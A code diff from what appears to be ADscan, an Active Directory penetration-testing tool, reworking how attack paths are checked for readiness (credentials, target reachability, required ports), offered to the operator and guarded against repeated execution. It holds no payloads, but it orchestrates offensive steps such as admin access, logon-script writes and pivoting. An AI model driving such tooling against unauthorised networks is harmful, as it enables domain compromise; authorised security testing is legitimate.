@@ -11,14 +11,15 @@ The goal is to reuse this flow from multiple places (e.g. Phase 2 summary,
 
 from __future__ import annotations
 
+from enum import Enum
 from typing import Any, Callable
 from contextlib import contextmanager
 from datetime import UTC, datetime
+import asyncio
 import os
 import re
 import secrets
 import shlex
-import sys
 import time
 
 from rich.prompt import Confirm, Prompt
@@ -36,14 +37,12 @@ from adscan_internal import (
     telemetry,
 )
 from adscan_internal.interaction import is_non_interactive
-from adscan_internal.integrations.netexec.timeouts import (
-    get_recommended_internal_timeout,
-)
 from adscan_internal.reporting_compat import load_optional_report_service_attr
 from adscan_internal.passwords import generate_strong_password, is_password_complex
 from adscan_internal.rich_output import (
     BRAND_COLORS,
     mark_sensitive,
+    order_attack_paths_for_display,
     print_panel,
     print_system_change_warning,
     print_attack_path_detail,
@@ -53,7 +52,6 @@ from adscan_internal.services.attack_graph_service import (
     infer_directory_object_enabled_state,
     get_node_by_label,
     get_attack_path_summaries,
-    get_owned_domain_usernames_for_attack_paths,
     resolve_netexec_target_for_node_label,
     resolve_group_name_by_rid,
     resolve_group_user_members,
@@ -62,6 +60,7 @@ from adscan_internal.services.attack_graph_service import (
 from adscan_internal.services.attack_graph_runtime_service import (
     clear_attack_path_execution,
     get_attack_path_followup_context,
+    get_attack_path_step_context,
     set_attack_path_step_context,
     set_attack_path_execution,
 )
@@ -99,7 +98,9 @@ from adscan_internal.services.ldap_transport_service import (
 from adscan_internal.services.attack_step_catalog import (
     relation_counts_for_execution_readiness,
     relation_requires_execution_context,
-    relation_requires_reachable_computer_target,
+)
+from adscan_internal.services.attack_step_target_access_service import (
+    resolve_attack_step_target_access_profile,
 )
 from adscan_internal.services.attack_path_cleanup_service import (
     begin_cleanup_scope,
@@ -119,7 +120,22 @@ from adscan_internal.services.logon_script_payload_service import (
     build_force_change_password_logon_script,
 )
 from adscan_internal.services.kerberos_ticket_service import KerberosTicketService
+from adscan_internal.services.async_bridge import run_async_sync
+from adscan_internal.services.network_probe_service import (
+    TCPProbeResult,
+    SERVICE_PROBE_PORTS,
+    action_to_service_ports,
+    tcp_probe_multi,
+)
+from adscan_internal.services.smb_privilege import (
+    SMBPrivilegeStatus,
+    verify_domain_user_local_admin,
+)
+from adscan_internal.services.rdp_login_service import scan_rdp_hosts
+from adscan_internal.services.winrm_access_probe_service import probe_winrm_available
+from adscan_internal.integrations.mssql.native_backend import ImpacketMSSQLBackend
 from adscan_internal.workspaces import domain_subpath, write_json_file
+from adscan_internal.models.domain import resolve_dc_ip
 
 
 ATTACK_PATH_SNAPSHOT_FILENAME = "attack_paths_snapshot.json"
@@ -933,11 +949,12 @@ def _execution_readiness_meta(
     target_matched_ips: tuple[str, ...] = ()
     target_vantage_mode = ""
     target_execution_advisory = ""
-    target_access_requirement = (
-        "computer_reachable"
-        if relation_requires_reachable_computer_target(action)
-        else "none"
-    )
+    target_access_profile = resolve_attack_step_target_access_profile(action)
+    target_access_requirement = target_access_profile.legacy_requirement
+    target_required_service = target_access_profile.required_service or ""
+    target_required_ports: tuple[int, ...] = target_access_profile.required_ports
+    target_access_mode = target_access_profile.access_mode
+    target_access_rationale = target_access_profile.rationale
     to_node: dict[str, Any] | None = None
     if to_label:
         to_node = get_node_by_label(shell, domain, label=to_label)
@@ -957,11 +974,21 @@ def _execution_readiness_meta(
                 )
             )
             if str(target_kind or "").strip().lower() == "computer":
+                target_access_profile = resolve_attack_step_target_access_profile(
+                    action,
+                    target_kind=target_kind,
+                )
+                target_access_requirement = target_access_profile.legacy_requirement
+                target_required_service = target_access_profile.required_service or ""
+                target_required_ports = target_access_profile.required_ports
+                target_access_mode = target_access_profile.access_mode
+                target_access_rationale = target_access_profile.rationale
                 target_viability = assess_computer_target_viability(
                     shell,
                     domain=domain,
                     principal_name=to_label,
                     node=to_node,
+                    required_ports=target_required_ports,
                 )
                 target_viability_status = target_viability.status
                 target_viability_summary = target_viability.operator_summary
@@ -978,6 +1005,27 @@ def _execution_readiness_meta(
                 target_execution_advisory = str(
                     target_viability.execution_advisory or ""
                 )
+                from adscan_internal.services._annotation_log_dedup import (
+                    annotation_log_seen,
+                )
+                # Dedup per (target, relation) within an annotation batch:
+                # thousands of paths share the same blocking step, and the
+                # repeated identical log line drowns the --debug output.
+                if not annotation_log_seen(
+                    ("target-access", str(to_label), str(action))
+                ):
+                    print_info_debug(
+                        "[target-access] "
+                        f"relation={mark_sensitive(action, 'detail')} "
+                        f"target={mark_sensitive(to_label, 'node')} "
+                        f"target_kind={mark_sensitive(target_kind, 'detail')} "
+                        f"mode={mark_sensitive(target_access_mode, 'detail')} "
+                        f"legacy_requirement={mark_sensitive(target_access_requirement, 'detail')} "
+                        f"service={mark_sensitive(target_required_service or 'none', 'detail')} "
+                        f"ports={mark_sensitive(str(list(target_required_ports)), 'detail')} "
+                        f"viability_status={mark_sensitive(target_viability_status or 'unknown', 'detail')} "
+                        f"matched_ips={mark_sensitive(str(list(target_matched_ips)), 'detail')}"
+                    )
     if action in ACL_ACE_RELATIONS and to_label:
         supported, support_reason = describe_ace_relation_support(action, target_kind)
         if not supported:
@@ -998,6 +1046,10 @@ def _execution_readiness_meta(
                 "execution_target_vantage_mode": target_vantage_mode,
                 "execution_target_execution_advisory": target_execution_advisory,
                 "execution_target_access_requirement": target_access_requirement,
+                "execution_target_access_mode": target_access_mode,
+                "execution_target_required_service": target_required_service,
+                "execution_target_required_ports": list(target_required_ports),
+                "execution_target_access_rationale": target_access_rationale,
                 "execution_target_label": to_label,
                 "execution_ready_count": 0,
                 "execution_candidate_count": 0,
@@ -1007,7 +1059,7 @@ def _execution_readiness_meta(
             }
 
     if (
-        target_access_requirement == "computer_reachable"
+        target_access_profile.block_on_unreachable
         and str(target_kind or "").strip().lower() == "computer"
     ):
         blocked_reason = ""
@@ -1051,6 +1103,10 @@ def _execution_readiness_meta(
                 "execution_target_vantage_mode": target_vantage_mode,
                 "execution_target_execution_advisory": target_execution_advisory,
                 "execution_target_access_requirement": target_access_requirement,
+                "execution_target_access_mode": target_access_mode,
+                "execution_target_required_service": target_required_service,
+                "execution_target_required_ports": list(target_required_ports),
+                "execution_target_access_rationale": target_access_rationale,
                 "execution_target_label": to_label,
                 "execution_ready_count": 0,
                 "execution_candidate_count": 0,
@@ -1081,6 +1137,10 @@ def _execution_readiness_meta(
             "execution_target_vantage_mode": target_vantage_mode,
             "execution_target_execution_advisory": target_execution_advisory,
             "execution_target_access_requirement": target_access_requirement,
+            "execution_target_access_mode": target_access_mode,
+            "execution_target_required_service": target_required_service,
+            "execution_target_required_ports": list(target_required_ports),
+            "execution_target_access_rationale": target_access_rationale,
             "execution_target_label": to_label,
             "execution_ready_count": 1 if ready else 0,
             "execution_candidate_count": 1,
@@ -1118,6 +1178,11 @@ def _execution_readiness_meta(
             "execution_target_matched_ips": list(target_matched_ips),
             "execution_target_vantage_mode": target_vantage_mode,
             "execution_target_execution_advisory": target_execution_advisory,
+            "execution_target_access_requirement": target_access_requirement,
+            "execution_target_access_mode": target_access_mode,
+            "execution_target_required_service": target_required_service,
+            "execution_target_required_ports": list(target_required_ports),
+            "execution_target_access_rationale": target_access_rationale,
             "execution_ready_count": 1,
             "execution_candidate_count": 1,
             "execution_candidate_source": "from_label_credential",
@@ -1140,6 +1205,11 @@ def _execution_readiness_meta(
             "execution_target_matched_ips": list(target_matched_ips),
             "execution_target_vantage_mode": target_vantage_mode,
             "execution_target_execution_advisory": target_execution_advisory,
+            "execution_target_access_requirement": target_access_requirement,
+            "execution_target_access_mode": target_access_mode,
+            "execution_target_required_service": target_required_service,
+            "execution_target_required_ports": list(target_required_ports),
+            "execution_target_access_rationale": target_access_rationale,
             "execution_ready_count": 0,
             "execution_candidate_count": 1,
             "execution_candidate_source": "from_label_user_node",
@@ -1175,6 +1245,10 @@ def _execution_readiness_meta(
             "execution_target_vantage_mode": target_vantage_mode,
             "execution_target_execution_advisory": target_execution_advisory,
             "execution_target_access_requirement": target_access_requirement,
+            "execution_target_access_mode": target_access_mode,
+            "execution_target_required_service": target_required_service,
+            "execution_target_required_ports": list(target_required_ports),
+            "execution_target_access_rationale": target_access_rationale,
             "execution_target_label": to_label,
             "execution_ready_count": len(ready_users),
             "execution_candidate_count": affected_count or len(affected_users),
@@ -1203,6 +1277,11 @@ def _execution_readiness_meta(
             "execution_target_matched_ips": list(target_matched_ips),
             "execution_target_vantage_mode": target_vantage_mode,
             "execution_target_execution_advisory": target_execution_advisory,
+            "execution_target_access_requirement": target_access_requirement,
+            "execution_target_access_mode": target_access_mode,
+            "execution_target_required_service": target_required_service,
+            "execution_target_required_ports": list(target_required_ports),
+            "execution_target_access_rationale": target_access_rationale,
             "execution_ready_count": len(stored_creds),
             "execution_candidate_count": len(stored_creds),
             "execution_candidate_source": "all_stored_credentials_fallback",
@@ -1225,6 +1304,11 @@ def _execution_readiness_meta(
         "execution_target_matched_ips": list(target_matched_ips),
         "execution_target_vantage_mode": target_vantage_mode,
         "execution_target_execution_advisory": target_execution_advisory,
+        "execution_target_access_requirement": target_access_requirement,
+        "execution_target_access_mode": target_access_mode,
+        "execution_target_required_service": target_required_service,
+        "execution_target_required_ports": list(target_required_ports),
+        "execution_target_access_rationale": target_access_rationale,
         "execution_ready_count": 0,
         "execution_candidate_count": 0,
         "execution_candidate_source": "unresolved",
@@ -1241,28 +1325,177 @@ def _annotate_execution_readiness(
     context_username: str | None,
     context_password: str | None,
 ) -> list[dict[str, Any]]:
-    """Attach execution readiness metadata used by the attack-path UX."""
+    """Attach execution readiness metadata used by the attack-path UX.
+
+    Runs inside an ``annotation_log_dedup_scope`` so the per-summary debug
+    logs (``[viability-gate]`` and ``[target-access]``) collapse to one
+    line per unique target/relation across the batch.  Without this, a
+    workspace with 12k paths sharing a single blocking host emitted 25k+
+    identical debug lines under ``--debug``.
+    """
+    from adscan_internal.services._annotation_log_dedup import (
+        annotation_log_dedup_scope,
+    )
+
     annotated: list[dict[str, Any]] = []
-    for summary in summaries:
-        current = dict(summary)
-        meta = current.get("meta")
-        if not isinstance(meta, dict):
-            meta = {}
-            current["meta"] = meta
-        else:
-            meta = dict(meta)
-            current["meta"] = meta
-        readiness = _execution_readiness_meta(
-            shell,
-            domain=domain,
-            summary=current,
-            context_username=context_username,
-            context_password=context_password,
-        )
-        if readiness:
-            meta.update(readiness)
-        annotated.append(current)
+    with annotation_log_dedup_scope() as _dedup:
+        for summary in summaries:
+            annotated.append(
+                annotate_summary_execution_readiness(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    context_username=context_username,
+                    context_password=context_password,
+                )
+            )
+        if _dedup:
+            print_info_debug(
+                f"[annotate-batch] suppressed duplicate debug lines: "
+                f"{len(_dedup)} unique key(s) across {len(summaries)} path(s) annotated"
+            )
     return annotated
+
+
+def annotate_summary_execution_readiness(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    context_username: str | None = None,
+    context_password: str | None = None,
+) -> dict[str, Any]:
+    """Return a copy of *summary* with the readiness gate metadata applied.
+
+    This is the canonical way for any entry point that may execute one attack
+    path to attach the reachability/credential gate metadata before deciding
+    whether to offer execution.  Callers that omit ``context_username`` /
+    ``context_password`` get the same gate result as the listing flow when no
+    additional credential context is available.
+    """
+    current = dict(summary)
+    meta = current.get("meta")
+    if not isinstance(meta, dict):
+        meta = {}
+        current["meta"] = meta
+    else:
+        meta = dict(meta)
+        current["meta"] = meta
+    readiness = _execution_readiness_meta(
+        shell,
+        domain=domain,
+        summary=current,
+        context_username=context_username,
+        context_password=context_password,
+    )
+    if readiness:
+        meta.update(readiness)
+    return current
+
+
+def offer_attack_path_execution(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    allowed: bool,
+    context_username: str | None = None,
+    context_password: str | None = None,
+    search_mode_label: str | None = None,
+) -> bool:
+    """Canonical UX helper: gate-check, prompt, execute — in that order.
+
+    Encapsulates the offer-then-execute pattern that is shared between the
+    interactive listing flow and the path-detail entry point in
+    ``run_attack_paths``.  Callers pass ``allowed=True`` when the scope and
+    TTY check permit execution, ``allowed=False`` to skip silently.
+
+    When the gate refuses the path because the target host is unreachable,
+    the pivoting follow-up is offered automatically — same UX the listing
+    flow surfaces for blocked paths.
+
+    Returns True when execution was started OR when a pivot probe ran
+    (both signal state changed: the caller should recompute summaries).
+    Returns False when nothing state-changing happened (user declined,
+    unsupported path with no viable pivot, or gate refused).
+    """
+    if not allowed:
+        return False
+    annotated = annotate_summary_execution_readiness(
+        shell,
+        domain=domain,
+        summary=summary,
+        context_username=context_username,
+        context_password=context_password,
+    )
+    meta = annotated.get("meta") or {}
+    support_status = str(meta.get("execution_support_status") or "").strip().lower()
+    if support_status in {"unsupported", "blocked"}:
+        reason = str(meta.get("execution_support_reason") or "").strip()
+        print_warning(
+            "ADscan refuses to execute this attack path: "
+            + (reason or "execution is not supported from the current vantage.")
+        )
+        advisory = str(meta.get("execution_target_execution_advisory") or "").strip()
+        if advisory:
+            print_info(advisory)
+        viability_status = (
+            str(meta.get("execution_target_viability_status") or "").strip().lower()
+        )
+        target_label = str(meta.get("execution_target_label") or "").strip()
+        if target_label and viability_status:
+            # Inference short-circuit: if every reasonable source (direct
+            # vantage + every probed pivot) has already failed to reach
+            # the target, do not run the pivot UX again. The negative
+            # evidence is already persisted; re-probing wastes a WinRM
+            # session.
+            matched_ips = [
+                str(ip).strip()
+                for ip in (meta.get("execution_target_matched_ips") or [])
+                if str(ip).strip()
+            ]
+            _skip_pivot = False
+            if matched_ips:
+                from adscan_internal.services.target_reachability_inference_service import (
+                    infer_target_reachability,
+                )
+                for _ip in matched_ips:
+                    _verdict = infer_target_reachability(shell, domain=domain, target_ip=_ip)
+                    if _verdict.globally_unreachable:
+                        _skip_pivot = True
+                        from adscan_internal import print_info_debug as _dbg
+                        _dbg(
+                            "[attack_paths] skipping pivot UX (offer_attack_path_execution) — "
+                            f"target globally unreachable: ip={mark_sensitive(_ip, 'ip')} "
+                            f"rationale={mark_sensitive(_verdict.rationale, 'detail')}"
+                        )
+                        break
+            if not _skip_pivot:
+                _pivot_evaluated = maybe_offer_pivot_opportunity_for_host_viability(
+                    shell,
+                    domain=domain,
+                    blocked_target=target_label,
+                    viability_status=viability_status,
+                    operator_summary=None,
+                )
+                # Pivot UX ran (and may have probed + persisted a report).
+                # Tell the caller to recompute so the table reflects the
+                # new inference state (the just-probed pivot becomes
+                # negative evidence for any path sharing this target).
+                if _pivot_evaluated:
+                    return True
+        return False
+    if not Confirm.ask("Execute this attack path now?", default=True):
+        return False
+    execute_selected_attack_path(
+        shell,
+        domain,
+        summary=annotated,
+        context_username=context_username,
+        context_password=context_password,
+        search_mode_label=search_mode_label,
+    )
+    return True
 
 
 def _path_has_ready_execution_context(summary: dict[str, Any]) -> bool:
@@ -1285,6 +1518,190 @@ def _path_is_supported_for_execution(summary: dict[str, Any]) -> bool:
         "unsupported",
         "blocked",
     }
+
+
+def attack_path_session_signature(summary: dict[str, Any]) -> tuple | None:
+    """Return a stable cross-refresh identity for a path summary.
+
+    The summary dicts are recreated on every refresh — Python identity
+    (``id(summary)``) is therefore useless for "have we already tried
+    this path in this session?". Index positions also reset because the
+    refresh re-ranks the list (a step transitioning to ``success`` moves
+    the path to a different bucket). The only reliable identifier is a
+    hash of the **logical path itself**: the source principal, the
+    terminal target, and the node sequence in between.
+
+    Defense-in-depth motivation (the reason this function exists at all):
+    even when ``_path_is_actionable_for_execution_prompt`` derives the
+    correct ``actionable`` set, the **default selection** in the picker
+    can still land on a path we just tried if the step status update
+    failed silently (the path still reads ``theoretical`` and admits
+    selection). Tracking attempts at the path-identity level closes that
+    loop. The bug class it defends against:
+
+    * A vendor-side regression that swallows the edge-status write.
+    * A race between cleanup-revert and refresh that re-sets the status.
+    * A future engine that returns paths without per-step status.
+    * Any code path that fails to call ``update_edge_status_by_labels``
+      after a successful exec.
+
+    In all those cases, the index-based ``_tried_idx_set`` is reset on
+    refresh and the status-based actionability gate admits the path
+    again — but this signature does **not** reset. The path can only be
+    re-selected manually by the operator in interactive mode; CI is
+    guaranteed to converge.
+
+    The signature components, in order of preference:
+
+    1. ``_exact_signature`` — populated by ``attack_graph_core`` at
+       materialisation time. Includes the exact node sequence and the
+       relation identity tuple, so two paths that share endpoints but
+       traverse different intermediate nodes get different signatures.
+       This is the canonical identifier when available.
+    2. Synthetic fallback ``(source, target, tuple(nodes))`` — covers
+       summaries that lack ``_exact_signature`` (older engines, manual
+       dict construction in tests). Stable enough for the guardrail
+       because the same logical path always materialises the same node
+       sequence.
+
+    Returns ``None`` when neither identifier can be computed (e.g. the
+    summary is missing both ``_exact_signature`` and ``nodes``). The
+    caller treats ``None`` as "do not record" — better to risk one
+    extra retry than to suppress every path in the session by hashing
+    the empty tuple.
+    """
+    if not isinstance(summary, dict):
+        return None
+    sig = summary.get("_exact_signature")
+    if sig is not None:
+        try:
+            hash(sig)
+            return sig if isinstance(sig, tuple) else (sig,)
+        except TypeError:
+            # _exact_signature exists but contains an unhashable nested
+            # element (e.g. a list someone smuggled in). Fall through to
+            # the synthetic identifier — safer than crashing the loop.
+            pass
+    source = str(summary.get("source") or "")
+    target = str(summary.get("target") or "")
+    nodes = summary.get("nodes")
+    if isinstance(nodes, list) and nodes:
+        if not source:
+            source = str(nodes[0] or "")
+        if not target:
+            target = str(nodes[-1] or "")
+        if source and target:
+            return (source, target, tuple(str(n) for n in nodes))
+    # Lenient fallback: ``source`` + ``target`` alone is a coarser
+    # identifier than the full node sequence, but it is still strong
+    # enough for the guardrail purpose. Two paths that share both
+    # endpoints but traverse different intermediate nodes will collide
+    # in this set — preventing one from being retried after the other
+    # was attempted. That is the conservative direction: a false
+    # collision merely declines an extra attempt; missing this
+    # signature entirely (the previous behaviour) lets a misshapen
+    # summary loop infinitely because no record is kept. Production
+    # paths always populate ``nodes`` so they hit the strict branch
+    # above; the fallback exists for tests and for any future engine
+    # that emits a slimmer summary shape.
+    if source and target:
+        return ("source_target_only", source, target)
+    return None
+
+
+def autocorrect_summary_statuses_from_steps(
+    records: list[dict[str, Any]],
+    *,
+    domain: str,
+) -> int:
+    """Re-derive ``record['status']`` from ``record['steps']`` in-place.
+
+    This is the defensive guard that keeps the post-execution refresh loop
+    from spinning forever when an upstream caller (or a future engine
+    refactor) hands back summaries whose top-level ``status`` field is
+    stale relative to the live step statuses they carry.
+
+    The 2026-05-20 incident (HTB Puppy, ``adscan ci``) showed why this is
+    load-bearing: the CI fallback in ``attack_graph_reports.py`` was the
+    one caller of ``offer_attack_paths_for_execution_summaries`` that
+    forgot to thread ``recompute_summaries``. The downstream
+    ``_refresh_summaries`` therefore reused the pre-execution snapshot,
+    every record stayed at ``status='theoretical'`` even after the steps
+    transitioned to ``success``, and
+    :func:`_path_is_actionable_for_execution_prompt` re-selected the same
+    path forever — visible in the logs as repeated ``re-prompting after
+    execution`` lines with ``actionable=1`` and no fresh DFS pipeline
+    between iterations. The root-cause wiring is now in place, but this
+    guard exists so a future eighth caller that makes the same mistake
+    cannot reintroduce the loop.
+
+    Args:
+        records: Summary dicts as produced by ``get_attack_path_summaries``.
+            Mutated in-place when drift is detected. Items that are not
+            dicts, or that lack a non-empty ``steps`` list, are skipped.
+        domain: Domain name — only used for the debug log line so the
+            message ties back to the active engagement.
+
+    Returns:
+        Number of records whose ``status`` was rewritten. Useful for
+        tests and telemetry; production callers can ignore it.
+
+    Notes:
+        The derivation helper called here
+        (:func:`_derive_display_status_from_steps` in
+        ``attack_paths_core``) is the same one used by the renderer-side
+        drift detector in ``adscan_core/output/_attack_paths.py``, so
+        the two layers cannot diverge. If the drift detector reports a
+        mismatch but this guard does not fix it, the bug is in the
+        derivation helper itself — not in this function.
+    """
+    if not records:
+        return 0
+
+    from adscan_internal.services.attack_paths_core import (
+        _CONTEXT_RELATIONS_LOWER,
+        _derive_display_status_from_steps,
+    )
+
+    fixed = 0
+    marked_domain = mark_sensitive(domain, "domain")
+    for record in records:
+        if not isinstance(record, dict):
+            continue
+        steps = record.get("steps")
+        if not isinstance(steps, list) or not steps:
+            continue
+
+        # Critical safety rule: never auto-correct if the steps lack
+        # explicit per-step status data. ``_derive_display_status_from_steps``
+        # returns ``'theoretical'`` as its default when no step carries a
+        # status value — which would silently DOWNGRADE a correct
+        # ``'exploited'`` (or ``'attempted'``) summary to ``'theoretical'``
+        # whenever the recompute callback returns records that store the
+        # rollup at summary level only. The guard's purpose is to fix
+        # stale rollups using LIVE step evidence; if there is no live step
+        # evidence, the existing rollup is the most reliable value we have.
+        has_executable_status = any(
+            isinstance(step, dict)
+            and str(step.get("status") or "").strip()
+            and str(step.get("action") or "").strip().lower()
+            not in _CONTEXT_RELATIONS_LOWER
+            for step in steps
+        )
+        if not has_executable_status:
+            continue
+
+        fresh = _derive_display_status_from_steps(steps)
+        current = str(record.get("status") or "").strip().lower()
+        if fresh and fresh != current:
+            print_info_debug(
+                "[attack_paths] status auto-corrected from steps: "
+                f"domain={marked_domain} "
+                f"old={current or 'theoretical'!r} new={fresh!r}"
+            )
+            record["status"] = fresh
+            fixed += 1
+    return fixed
 
 
 def _path_is_actionable_for_execution_prompt(
@@ -1396,17 +1813,138 @@ def _format_non_actionable_reason_summary(reasons: dict[str, int]) -> str:
     return ", ".join(parts) if parts else "none"
 
 
+def _attack_path_step_readiness_reason(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    steps: list[dict[str, Any]],
+    step_index: int,
+    context_username: str | None,
+    context_password: str | None,
+) -> str:
+    """Return an empty string if the step is ready, otherwise a short reason.
+
+    Mirrors :func:`_attack_path_step_has_executable_context` but produces a
+    user-facing explanation of which precondition is missing (credentials,
+    target reachability, ...). Kept separate so the boolean fast path stays
+    cheap for the existing skip-success logic.
+    """
+    if step_index < 1 or step_index > len(steps):
+        return "invalid step index"
+    step_item = steps[step_index - 1]
+    if not isinstance(step_item, dict):
+        return "invalid step payload"
+
+    step_action = str(step_item.get("action") or "").strip()
+    step_key = step_action.lower()
+    step_details = (
+        step_item.get("details") if isinstance(step_item.get("details"), dict) else {}
+    )
+    from_label = str(step_details.get("from") or "").strip()
+    to_label = str(step_details.get("to") or "").strip()
+    if not step_action:
+        return "no action"
+
+    if step_key in ACL_ACE_RELATIONS:
+        try:
+            exec_context = build_ace_step_context(
+                shell,
+                domain,
+                relation=step_action,
+                summary=summary,
+                from_label=from_label,
+                to_label=to_label,
+                context_username=context_username,
+                context_password=context_password,
+            )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            return "context resolution failed"
+        if not str(getattr(exec_context, "exec_username", "") or "").strip():
+            return f"no controller for {from_label or '?'}"
+        if not str(getattr(exec_context, "exec_password", "") or "").strip():
+            principal = (
+                str(getattr(exec_context, "exec_username", "") or "").strip()
+                or from_label
+                or "?"
+            )
+            return f"missing credentials for {principal}"
+        return ""
+
+    exec_username = _resolve_execution_user(
+        shell,
+        domain=domain,
+        context_username=context_username,
+        summary=summary,
+        from_label=from_label,
+    )
+    if not exec_username:
+        return f"no executor resolved for {from_label or '?'}"
+    exec_password = _resolve_attack_path_step_password(
+        shell,
+        domain=domain,
+        exec_username=exec_username,
+        context_username=context_username,
+        context_password=context_password,
+    )
+    if not exec_password:
+        return f"missing credentials for {exec_username}"
+
+    if step_key in {"adminto", "sqlaccess", "sqladmin", "canrdp", "canpsremote"}:
+        if not (
+            to_label
+            and resolve_netexec_target_for_node_label(
+                shell,
+                domain,
+                node_label=to_label,
+            )
+        ):
+            return f"target {to_label or '?'} unreachable"
+    elif step_key == "allowedtodelegate":
+        if not (from_label and to_label):
+            return "missing delegation endpoints"
+    elif step_key == "writelogonscript":
+        domain_data = (
+            getattr(shell, "domains_data", {}).get(domain, {})
+            if isinstance(getattr(shell, "domains_data", None), dict)
+            else {}
+        )
+        if not (
+            str(step_details.get("host") or "").strip()
+            or _resolve_default_domain_controller(domain_data, domain)
+        ):
+            return "no host or DC available"
+    return ""
+
+
 def _choose_custom_attack_path_start_step(
     shell: Any,
     *,
+    domain: str,
+    summary: dict[str, Any],
     steps: list[dict[str, Any]],
     executable_indices: list[int],
     default_step_idx: int,
+    context_username: str | None = None,
+    context_password: str | None = None,
 ) -> int | None:
-    """Let the operator choose a custom executable step index."""
+    """Let the operator choose a custom executable step index.
+
+    Each executable step is annotated with a readiness tag computed against
+    the current credential store and runtime context:
+
+    * ``[ready]`` — preconditions satisfied, ADscan can run it now.
+    * ``[locked — <reason>]`` — preconditions missing (credentials, reachable
+      target, ...). The option is still selectable so power users can override
+      a stale resolver decision; selecting it triggers an auto-resolve confirm
+      that offers to start from the first ready step instead.
+    """
     if not hasattr(shell, "_questionary_select"):
         return default_step_idx
 
+    readiness: list[tuple[bool, str]] = []
+    first_ready_idx: int | None = None
     options: list[str] = []
     default_option_idx = 0
     for option_idx, step_idx in enumerate(executable_indices):
@@ -1429,12 +1967,36 @@ def _choose_custom_attack_path_start_step(
             ).strip()
             or "?"
         )
+        lock_reason = _attack_path_step_readiness_reason(
+            shell,
+            domain=domain,
+            summary=summary,
+            steps=steps,
+            step_index=step_idx,
+            context_username=context_username,
+            context_password=context_password,
+        )
+        is_ready = not lock_reason
+        readiness.append((is_ready, lock_reason))
+        if is_ready and first_ready_idx is None:
+            first_ready_idx = step_idx
+        readiness_tag = "[ready]" if is_ready else f"[locked — {lock_reason}]"
         options.append(
-            f"Step #{step_idx}: {action} [{status}] {from_label} -> {to_label}"
+            f"Step #{step_idx}: {action} [{status}] {from_label} -> {to_label} "
+            f"{readiness_tag}"
         )
         if step_idx == default_step_idx:
             default_option_idx = option_idx
     options.append("Cancel execution")
+
+    # If the suggested default is locked but a ready step exists, prefer it
+    # so the cursor lands on something the user can run without overrides.
+    if (
+        readiness
+        and not readiness[default_option_idx][0]
+        and first_ready_idx is not None
+    ):
+        default_option_idx = executable_indices.index(first_ready_idx)
 
     selection = shell._questionary_select(
         "Choose a custom start step:",
@@ -1445,7 +2007,35 @@ def _choose_custom_attack_path_start_step(
         return None
     if selection >= len(executable_indices):
         return None
-    return executable_indices[selection]
+
+    chosen_step_idx = executable_indices[selection]
+    chosen_ready, chosen_reason = readiness[selection]
+    if (
+        not chosen_ready
+        and first_ready_idx is not None
+        and first_ready_idx != chosen_step_idx
+    ):
+        print_warning(f"Step #{chosen_step_idx} is locked: {chosen_reason}.")
+        choice = shell._questionary_select(
+            "Preconditions are not met. What do you want to do?",
+            [
+                f"Start from Step #{first_ready_idx} instead (auto-resolve, recommended)",
+                f"Run Step #{chosen_step_idx} anyway (override)",
+                "Cancel execution",
+            ],
+            default_idx=0,
+        )
+        if choice is None or choice == 2:
+            return None
+        if choice == 0:
+            return first_ready_idx
+    elif not chosen_ready:
+        # No ready step exists at all — let the user override but warn once.
+        print_warning(
+            f"Step #{chosen_step_idx} is locked: {chosen_reason}. "
+            "Running anyway; expect failures if preconditions don't resolve at runtime."
+        )
+    return chosen_step_idx
 
 
 def _find_next_attack_path_executable_step_index(
@@ -1681,66 +2271,36 @@ def _resolve_attack_path_start_step(
     )
     non_interactive = is_non_interactive(shell)
 
-    if domain_pwned and first_pending_idx is None:
-        if non_interactive:
+    # --- Non-interactive: use computed default, skip if nothing to do ---
+    if non_interactive:
+        if domain_pwned and first_pending_idx is None:
             print_info_debug(
                 "[attack_paths] no fresh steps remain for pwned domain; skipping path re-execution: "
                 f"domain={mark_sensitive(domain, 'domain')}"
             )
             return None
-        if not hasattr(shell, "_questionary_select"):
+        if first_execution_required_idx is None:
+            return None
+        return default_start_idx
+
+    # --- Text-only fallback (no _questionary_select) ---
+    if not hasattr(shell, "_questionary_select"):
+        if domain_pwned and first_pending_idx is None:
             print_info(
                 "No fresh executable steps remain in this attack path. "
                 "Skipping re-execution because the domain is already compromised."
             )
-            print_info_verbose(
-                "Use ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS=1 or choose a custom "
-                "start step to force re-execution."
-            )
             return (
                 first_executable_idx
                 if Confirm.ask(
-                    "This path has no fresh executable steps left. Re-run from the first step?",
+                    "Re-run from the first step?",
                     default=False,
                 )
                 else None
             )
-
-        options = [
-            "Skip execution (Recommended)",
-            f"Re-run from step #{first_executable_idx}",
-        ]
-        if len(executable_indices) > 1:
-            options.append("Choose custom start step")
-        choice = shell._questionary_select(
-            "This path has no fresh executable steps left. What do you want to do?",
-            options,
-            default_idx=0,
-        )
-        if choice is None or choice == 0:
-            return None
-        if choice == 1:
-            return first_executable_idx
-        if choice == 2:
-            return _choose_custom_attack_path_start_step(
-                shell,
-                steps=steps,
-                executable_indices=executable_indices,
-                default_step_idx=first_execution_required_idx or first_executable_idx,
-            )
-        return None
-
-    # If no pending steps, default to not re-execute unless explicitly requested.
-    if first_execution_required_idx is None:
-        if non_interactive:
-            return None
-        if not hasattr(shell, "_questionary_select"):
+        if first_execution_required_idx is None:
             print_info(
                 "All executable steps in this attack path are already marked as success."
-            )
-            print_info_verbose(
-                "Set ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS=1 to force re-execution "
-                "from the first step."
             )
             return (
                 first_executable_idx
@@ -1750,71 +2310,70 @@ def _resolve_attack_path_start_step(
                 )
                 else None
             )
+        print_info(f"Starting execution from step #{default_start_idx}.")
+        return default_start_idx
 
-        options = [
-            "Skip execution (Recommended)",
-            f"Re-run from step #{first_executable_idx}",
-        ]
-        if len(executable_indices) > 1:
-            options.append("Choose custom start step")
+    # --- Interactive: always offer step selector with smart default ---
+
+    # Edge case: no fresh steps — confirm before opening selector
+    if domain_pwned and first_pending_idx is None:
+        print_info(
+            "No fresh executable steps remain in this attack path "
+            "(domain is already compromised)."
+        )
         choice = shell._questionary_select(
-            "All executable steps are already successful. What do you want to do?",
-            options,
+            "What do you want to do?",
